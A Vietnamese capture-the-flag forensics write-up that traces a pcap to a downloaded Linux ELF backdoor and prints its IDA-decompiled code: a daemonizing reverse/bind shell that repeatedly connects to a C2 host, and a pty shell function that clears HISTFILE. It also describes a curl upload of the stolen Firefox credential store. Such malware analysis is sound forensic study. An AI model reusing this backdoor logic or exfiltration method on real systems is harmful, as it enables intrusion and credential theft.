Sau khi tải challange về mình thu được 1 file pcap 

<img width="1397" height="312" alt="image" src="https://github.com/user-attachments/assets/fce4d566-d485-4405-81f8-86217aa72940" />

Mở lên và ta thu được như sau:

<img width="1917" height="971" alt="image" src="https://github.com/user-attachments/assets/db0250f6-0188-4404-b266-5e81af51bb02" />

Ở packet số 4, máy 192.168.1.4 gửi một request HTTP GET /ic2kp đến máy 192.168.1.11.

Điều quan trọng nhất nằm ở packet 15: Phản hồi trả về chứa một định dạng (ELF). Điều này khẳng định rằng máy client đã tải xuống một file thực thi của hệ điều hành Linux (Linux executable binary). Mình sẽ tiến hành export file ic2kp để xem nó có gì.

<img width="1825" height="856" alt="image" src="https://github.com/user-attachments/assets/295bff09-e588-4e2d-8c23-650318d712d5" />

Mình tiến hành đưa vào máy ảo để phân tích, vì trong quá trình export windows defender có bắn cảnh báo nên mình chắc chắn trong file elf này chứa mã độc.

<img width="718" height="546" alt="image" src="https://github.com/user-attachments/assets/e718f871-96e6-4554-8b46-54babf2384fa" />


Sau đó mình đưa vào trong IDA để dịch ngược và tìm đến hàm main và cho ta kết quả như này :

<img width="1917" height="723" alt="image" src="https://github.com/user-attachments/assets/89400b1c-2740-446b-9fc5-28bc8eec18af" />

full hàm main: 

```
_int64 __fastcall main(int a1, char **a2, char **a3)
{
  int v3; // eax
  char *v4; // rax
  __pid_t v5; // eax
  unsigned int v6; // edx
  unsigned int i; // edi
  int v9; // ebx
  struct hostent *v10; // rax
  int v11; // eax
  int v12; // ebx
  int v13; // edi
  struct sockaddr v14; // [rsp+0h] [rbp-48h] BYREF
  sockaddr addr; // [rsp+10h] [rbp-38h] BYREF
  socklen_t optval[7]; // [rsp+2Ch] [rbp-1Ch] BYREF

  while ( 1 )
  {
    v3 = getopt(a1, a2, "s:p:c::");
    if ( v3 == -1 )
      break;
    switch ( v3 )
    {
      case 'p':
        word_E1C0 = strtol(optarg, 0LL, 10);
        if ( !word_E1C0 )
          sub_63AA(*a2);
        break;
      case 's':
        off_E1C8 = optarg;
        break;
      case 'c':
        v4 = optarg;
        if ( !optarg )
          v4 = "localhost";
        name = v4;
        break;
      default:
        sub_63AA(*a2);
    }
  }
  v5 = fork();
  v6 = 1;
  if ( v5 >= 0 )
  {
    v6 = 0;
    if ( !v5 )
    {
      if ( setsid() < 0 )
      {
        perror("socket");
        return 2;
      }
      else
      {
        optval[0] = 0;
        for ( i = 0; i <= 0x3FF; optval[0] = i )
        {
          close(i);
          i = optval[0] + 1;
        }
        if ( name )
        {
          do
          {
            while ( 1 )
            {
              do
              {
                do
                {
                  sleep(5u);
                  v9 = socket(2, 1, 0);
                }
                while ( v9 < 0 );
                v10 = gethostbyname(name);
              }
              while ( !v10 );
              memcpy(&v14.sa_data[2], *(const void **)v10->h_addr_list, v10->h_length);
              v14.sa_family = 2;
              *(_WORD *)v14.sa_data = __ROL2__(word_E1C0, 8);
              if ( connect(v9, &v14, 0x10u) >= 0 )
                break;
              close(v9);
            }
            v6 = sub_6A00(v9);
          }
          while ( v6 == 1 );
        }
        else
        {
          v11 = socket(2, 1, 0);
          v12 = v11;
          if ( v11 < 0 )
          {
            perror("socket");
            return 3;
          }
          else
          {
            optval[0] = 1;
            if ( setsockopt(v11, 1, 2, optval, 4u) < 0 )
            {
              perror("setsockopt");
              return 4;
            }
            else
            {
              addr.sa_family = 2;
              *(_WORD *)addr.sa_data = __ROL2__(word_E1C0, 8);
              *(_DWORD *)&addr.sa_data[2] = 0;
              if ( bind(v12, &addr, 0x10u) < 0 )
              {
                perror("bind");
                return 5;
              }
              else if ( listen(v12, 5) < 0 )
              {
                perror("listen");
                return 6;
              }
              else
              {
                while ( 1 )
                {
                  optval[0] = 16;
                  v13 = accept(v12, &v14, optval);
                  if ( v13 < 0 )
                    break;
                  v6 = sub_6A00(v13);
                  if ( v6 != 1 )
                    return v6;
                }
                perror("accept");
                return 7;
              }
            }
          }
        }
      }
    }
  }
  return v6;
}
```

Phân tích :Nhìn vào cấu trúc đây có lẽ là 1 backdoor/trojan 

```
v5 = fork();
if ( !v5 ) {
  if ( setsid() < 0 ) ...
  for ( i = 0; i <= 0x3FF; optval[0] = i ) {
    close(i); // Đóng tất cả các File Descriptors
  }
}
```

Mã độc sử dụng kỹ thuật Daemonize kinh điển trên Linux. Nó gọi fork() để tạo ra một tiến trình con (child process), sau đó gọi setsid() để tách tiến trình này ra khỏi terminal hiện tại. Vòng lặp close(i) từ 0 đến 1023 nhằm đóng toàn bộ các luồng nhập/xuất chuẩn (stdin, stdout, stderr).
=> Mục đích: Giúp mã độc chạy ngầm trong background một cách êm ái mà người dùng không hề hay biết, dù họ có tắt terminal đi chăng nữa.

Hai chế độ hoạt động: Reverse Shell & Bind Shell
Mã độc này rất linh hoạt, luồng thực thi của nó rẽ làm hai nhánh phụ thuộc vào biến name (được thiết lập qua tham số -c ở vòng lặp getopt phía trên):

Nhánh 1: Reverse Shell (Nếu có biến name)
Nó sẽ phân giải tên miền/IP bằng gethostbyname(name), liên tục thử kết nối connect(v9, ...) đến máy chủ C2 định kỳ sau mỗi 5 giây (sleep(5u)). Khi kết nối thành công, nó truyền socket v9 vào hàm sub_6A00

Nhánh 2: Bind Shell (Nếu không có biến name)
Nó sẽ tự mở một cổng cục bộ bằng bind(), lắng nghe kết nối tới bằng listen(), và chờ attacker chủ động kết nối vào bằng accept(). Khi attacker kết nối thành công, socket giao tiếp v13 cũng được truyền thẳng vào hàm sub_6A00

Vậy là revshell giao tiếp qua port 1234 mình quay lại wireshark và lọc các cổng đó ra: tcp.port == 1234

<img width="1917" height="930" alt="image" src="https://github.com/user-attachments/assets/eaab39f9-8011-42b6-b84e-c526bdff4fd1" />

Và khi mình follow tcp stream thì thấy 1 file là b12gb.zip

1. Phân tích nội dung TCP Stream
Hành động đánh cắp: Đây là một luồng HTTP POST request. Kẻ tấn công (hoặc mã độc) đang sử dụng công cụ curl (nhìn vào dòng User-Agent: curl/7.58.0) để upload một file lên máy chủ C2 tại địa chỉ 192.168.1.11:8000.

Định dạng file: Nhìn vào dòng Content-Disposition, file bị upload có tên là b12gb.zip. Ngay bên dưới phần header,có thể thấy các ký tự PK... — đây là "Magic bytes" (chữ ký tập tin) đặc trưng của mọi file định dạng nén ZIP.

Mục tiêu bị đánh cắp: Ngay sau chữ PK, có một đoạn text lọt ra: cert9.db. Đây là một manh mối kinh điển trong mảng Forensics. cert9.db (thường đi kèm với key4.db và logins.json) là các file cơ sở dữ liệu lưu trữ cấu hình bảo mật và mật khẩu đã lưu của trình duyệt Firefox.


Giờ mình sẽ cố gắng lấy file zip đó ra để xem bên trong có gì , đầu tiên mình đưa từ định dạng ban đầu là ascii thành raw :

<img width="1911" height="1008" alt="image" src="https://github.com/user-attachments/assets/72cab0f3-c4b4-4551-9e14-77e1c7c93196" />

Sau đó save as là b12gb.raw 

<img width="1916" height="977" alt="image" src="https://github.com/user-attachments/assets/98f7cf37-8299-4a77-b24f-a0ae4e4973a0" />

Sau đó dùng binwalk trích file zip ra:

<img width="1701" height="892" alt="image" src="https://github.com/user-attachments/assets/7031125d-19cf-40f1-9096-07d04e9cd4f4" />

Mình thu được file 16E.zip và file này cần password: 

<img width="807" height="616" alt="image" src="https://github.com/user-attachments/assets/c1845b41-f67a-46a3-95ef-88c222f7d644" />


Mục tiêu của chúng ta bây giờ là đi tìm password , để ý thấy các stream bên trong wireshark đã bị mã hóa nên ta không thể thu được mật khẩu nên chúng ta quay lại vào ida, mò vào các hàm sub_63D3(fd) , sub_6476(fd),sub_6523(fd). Luồng sơ đồ cho dễ hình dung
Main->sub_6A00( backdoor) -> (sub_63D3(fd) . sub_6476(fd) . sub_6523(fd) ) 3 hàm này mình nghĩ tương ứng với 3 chức năng lần lượt là mở shell, đánh cắp dữ liệu, và đẩy file 

Mình tiến hành kiểm tra thử hàm sub_6523 trước vì nó ở ngay trên hàm main mình đỡ phải tìm :
```
__int64 __fastcall sub_6523(int fd)
{
  int v2; // edx
  __int64 result; // rax
  char *v4; // rdx
  char *v5; // rax
  int v6; // edx
  int v7; // edi
  char *v8; // rax
  char *v9; // rbp
  int v10; // edx
  int v11; // edx
  int v12; // edx
  int v13; // eax
  char *v14; // rbp
  __pid_t v15; // edx
  __pid_t v16; // edx
  int v17; // edx
  void *v18; // rax
  int v19; // r12d
  __int64 v20; // r13
  fd_set *p_readfds; // rax
  int v22; // eax
  ssize_t v23; // rax
  int v24; // eax
  int aslave; // [rsp+Ch] [rbp-BCh] BYREF
  int amaster; // [rsp+10h] [rbp-B8h] BYREF
  int v27; // [rsp+14h] [rbp-B4h]
  _WORD v28[4]; // [rsp+18h] [rbp-B0h] BYREF
  fd_set readfds; // [rsp+20h] [rbp-A8h] BYREF
  char v30; // [rsp+A0h] [rbp-28h] BYREF

  v2 = openpty(&amaster, &aslave, 0LL, 0LL, 0LL);
  result = 24LL;
  if ( v2 >= 0 )
  {
    v4 = ttyname(aslave);
    result = 25LL;
    if ( v4 )
    {
      v5 = (char *)malloc(0xAuLL);
      if ( v5 )
      {
        strcpy(v5, "HISTFILE=");
        putenv(v5);
        v6 = sub_1818(fd);
        result = 37LL;
        if ( v6 == 1 )
        {
          v7 = v27;
          *(&buf + v27) = 0;
          v8 = (char *)malloc(v7 + 6);
          v9 = v8;
          if ( v8 )
          {
            *v8 = 84;
            v8[3] = 77;
            v8[1] = 69;
            v8[4] = 61;
            v8[2] = 82;
            strncpy(v8 + 5, &buf, v27 + 1);
            putenv(v9);
            v10 = sub_1818(fd);
            result = 39LL;
            if ( v10 == 1 && v27 == 4 )
            {
              v28[0] = (unsigned __int8)byte_FBC1 + ((unsigned __int8)buf << 8);
              v28[1] = (unsigned __int8)byte_FBC3 + ((unsigned __int8)byte_FBC2 << 8);
              v28[2] = 0;
              v28[3] = 0;
              v11 = ioctl(amaster, 0x5414uLL, v28);
              result = 40LL;
              if ( v11 >= 0 )
              {
                v12 = sub_1818(fd);
                result = 41LL;
                if ( v12 == 1 )
                {
                  v13 = v27;
                  *(&buf + v27) = 0;
                  v14 = (char *)malloc(v13 + 1);
                  if ( v14 )
                  {
                    strncpy(v14, &buf, v27 + 1);
                    v15 = fork();
                    result = 43LL;
                    if ( v15 >= 0 )
                    {
                      if ( v15 )
                      {
                        close(aslave);
                        v19 = fd / 64;
                        v20 = 1LL << (fd % 64);
                        while ( 1 )
                        {
                          do
                          {
                            p_readfds = &readfds;
                            do
                            {
                              p_readfds->fds_bits[0] = 0LL;
                              p_readfds = (fd_set *)((char *)p_readfds + 8);
                            }
                            while ( p_readfds != (fd_set *)&v30 );
                            readfds.fds_bits[v19] |= v20;
                            v22 = amaster;
                            readfds.fds_bits[amaster / 64] |= 1LL << (amaster % 64);
                            if ( v22 < fd )
                              v22 = fd;
                            if ( select(v22 + 1, &readfds, 0LL, 0LL, 0LL) < 0 )
                              return 49LL;
                            if ( (v20 & readfds.fds_bits[v19]) != 0 )
                            {
                              if ( (unsigned int)sub_1818(fd) != 1 )
                                return 50LL;
                              v23 = write(amaster, &buf, v27);
                              if ( v23 != v27 )
                                return 51LL;
                            }
                          }
                          while ( ((1LL << (amaster % 64)) & readfds.fds_bits[amaster / 64]) == 0 );
                          v24 = read(amaster, &buf, 0x1000uLL);
                          v27 = v24;
                          if ( !v24 )
                            return 54LL;
                          if ( v24 < 0 )
                            break;
                          if ( (unsigned int)sub_155F(fd) != 1 )
                            return 53LL;
                        }
                        return 52LL;
                      }
                      else
                      {
                        close(fd);
                        close(amaster);
                        v16 = setsid();
                        result = 44LL;
                        if ( v16 >= 0 )
                        {
                          v17 = ioctl(aslave, 0x540EuLL, 0LL);
                          result = 45LL;
                          if ( v17 >= 0 )
                          {
                            dup2(aslave, 0);
                            dup2(aslave, 1);
                            dup2(aslave, 2);
                            if ( aslave > 2 )
                              close(aslave);
                            v18 = malloc(8uLL);
                            if ( v18 )
                            {
                              *(_BYTE *)v18 = 47;
                              *((_BYTE *)v18 + 4) = 47;
                              *((_BYTE *)v18 + 1) = 98;
                              *((_BYTE *)v18 + 5) = 115;
                              *((_BYTE *)v18 + 2) = 105;
                              *((_BYTE *)v18 + 6) = 104;
                              *((_BYTE *)v18 + 3) = 110;
                              *((_BYTE *)v18 + 7) = 0;
                              execl((const char *)v18, (const char *)v18 + 5, "-c", v14, 0LL);
                              return 48LL;
                            }
                            else
                            {
                              return 47LL;
                            }
                          }
                        }
                      }
                    }
                  }
                  else
                  {
                    return 42LL;
                  }
                }
              }
            }
          }
          else
          {
            return 38LL;
          }
        }
      }
      else
      {
        return 36LL;
      }
    }
  }
  return result;
}
```









